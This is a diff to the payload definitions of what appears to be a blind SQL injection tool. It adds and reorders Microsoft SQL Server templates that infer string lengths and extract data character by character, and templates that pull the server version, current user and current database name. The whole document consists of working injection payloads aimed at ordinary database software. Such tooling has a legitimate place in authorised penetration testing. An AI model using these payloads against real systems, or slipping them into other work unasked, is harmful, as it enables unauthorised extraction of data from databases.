@@ -43,6 +43,7 @@ LENGTH_PAYLOADS = {
         "ASCII(SUBSTRC(NVL(CAST(LENGTH({query}) AS VARCHAR(4000)),0),{position},1))={char}",
     ],
     "Microsoft SQL Server": [
+        "ASCII(RIGHT(LEFT(LTRIM(STR(LEN({query}))),{position}),1))={char}",
         "UNICODE(SUBSTRING(LTRIM(STR(LEN({query}))),{position},1))={char}",
         "UNICODE(SUBSTRING(LEN({query}),{position},1))={char}",
         "UNICODE(SUBSTRING(ISNULL(CAST(LEN({query}) AS NVARCHAR(4000)),0),{position},1))={char}",
@@ -68,6 +69,7 @@ DATA_EXTRACTION_PAYLOADS = {
         # "CHAR": "SUBSTR({query},{position},1)=CHR({char})",
     },
     "Microsoft SQL Server": {
+        "ascii-left-right": "ASCII(RIGHT(LEFT({query},{position}),1))={char}",
         "no-cast": "UNICODE(SUBSTRING({query},{position},1))={char}",
         "isnull": "UNICODE(SUBSTRING(ISNULL({query},' '),{position},1))={char}",
         "cast": "UNICODE(SUBSTRING(ISNULL(CAST({query} AS NVARCHAR(4000)),' '),{position},1))={char}",
@@ -118,7 +120,7 @@ PAYLOADS_BANNER = {
         "(SELECT version FROM v$instance)",
         "(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')",
     ],
-    "Microsoft SQL Server": ["(SELECT @@VERSION)", "@@VERSION"],
+    "Microsoft SQL Server": ["@@VERSION", "(SELECT @@VERSION)"],
     "PostgreSQL": ["VERSION()", "(SELECT version())"],
 }
 
@@ -132,8 +134,11 @@ PAYLOADS_CURRENT_USER = {
     ],
     "Oracle": ["(SELECT USER FROM DUAL)"],
     "Microsoft SQL Server": [
-        "(SELECT SYSTEM_USER)",
+        "CURRENT_USER",
         "SYSTEM_USER",
+        "user",
+        "user_name()",
+        "(SELECT SYSTEM_USER)",
         "(SELECT user)",
         "(SELECT user_name())",
         "(SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID)",
@@ -162,7 +167,7 @@ PAYLOADS_CURRENT_DATABASE = {
         "(SELECT name FROM v$database)",
         "(SELECT instance_name FROM v$instance)",
     ],
-    "Microsoft SQL Server": ["(SELECT DB_NAME())", "DB_NAME()"],
+    "Microsoft SQL Server": ["DB_NAME()", "(SELECT DB_NAME())"],
     "PostgreSQL": ["CURRENT_SCHEMA()", "(SELECT current_database())"],
 }
 
